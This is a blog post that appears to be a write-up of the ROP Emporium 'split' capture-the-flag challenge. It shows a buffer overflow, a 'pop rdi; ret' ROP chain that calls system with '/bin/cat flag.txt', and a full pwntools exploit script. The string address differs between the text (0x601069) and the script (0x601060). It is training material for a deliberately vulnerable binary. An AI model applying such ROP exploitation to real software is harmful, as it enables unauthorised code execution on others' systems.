---
layout: post
title: ropemporium - split
date: 2024-12-23 09:00:00 +0300
description: # Add post description (optional)
img: split-1.png # (optional)
fig-caption: # Add figcaption (optional)
tags: ctf
---

The second challenge of Ropemporium consist of forging a little ROP chain in order to call the imported function "system" with specified parameters, found in a string in the code with the "**/bin/cat flag.txt**" value.

Checking the program protections first with *pwn checksec* we discovered the following protections:
- NX (Non executable stack)

![split]({{site.baseurl}}/assets/img/split-1.png)

Then we identified the imported functions using *rabin2* in order to check the "*system*" functing being properly imported.

![split]({{site.baseurl}}/assets/img/split-2.png)

Then, checking for the functions that the program have, we discovered the function named "*usefulFunction*".

![split]({{site.baseurl}}/assets/img/split-3.png)

Disassembling the functions with _gdb_, we found that the code is just putting a random value inside **EDI**, then calling "*system*" function (the string in question is just "**/bin/ls**").

![split]({{site.baseurl}}/assets/img/split-4.png)

The challenge here is to pass a proper parameter in order to call the "**system**" function, so we could read the flag.

Searching for specific instructions that the challenge gave us, we found an interesting string named "**usefulString**" with the "**/bin/cat flag.txt**" inside of it:

![split]({{site.baseurl}}/assets/img/split-5.png)
![split]({{site.baseurl}}/assets/img/split-6.png)

We could find the address of "**usefulString**":
![split]({{site.baseurl}}/assets/img/split-7.png)
```
0x601069
```

Great! Now we just combine that as a parameter with a gadget found in a way to push that value to the RDI register as we can see in the function calling convention.

![split]({{site.baseurl}}/assets/img/split-8.png)

Checking for gadgets we could use inside the code, we found a gadget really adequate for our needs:

![split]({{site.baseurl}}/assets/img/split-9.png)

### Getting its address
```
0x4007c3
```

Now we can create a payload with the following logic to exploit the code and run the desired system with the parameters to cat our way to the flag.

### Forging the ROP chain to inject
{% highlight python %}
(Buffer fill) + ('pop rdi; ret' gadget) + ('/bin/cat flag/txt' address) + ('system' function address)
{% endhighlight %}

Giving us the final exploitation code:
{% highlight python %}
from pwn import *

POP_RDI = 0x4007c3
CAT_FLAG = 0x601060
SYSTEM_FUNC = 0x40074b


elf = context.binary = ELF('./split')

io = process(elf.path)

info("Sending 128 byte cyclic pattern")
io.send(cyclic(128))

info("Awaiting program to crash...")
io.wait()

info("Dumping corefile")
core = io.corefile
stack = core.rsp

pattern = core.read(stack, 8)
info("%r : Pattern found", pattern)

info("Creating payload...")

rop = p64(POP_RDI)+p64(CAT_FLAG)+p64(SYSTEM_FUNC)

payload = flat({pattern: rop})

info("Sending Payload: %r", payload)

io = process(elf.path)
io.sendline(payload)
io.interactive()
{% endhighlight %}

Running it we could obtain the flag:
![split]({{site.baseurl}}/assets/img/split-10.png)